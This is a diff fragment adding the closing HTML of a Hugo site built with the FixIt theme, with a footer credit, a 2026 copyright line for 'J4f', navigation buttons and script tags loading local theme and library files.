+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2-20260109063229-50d27e0e"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">J4f</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
+              <circle class="bg" cx="50" cy="50" r="50"></circle>
+              <circle class="progress" cx="50" cy="50" r="50"></circle>
+            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/968dc22ae287858e91e33ef088daecd0.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
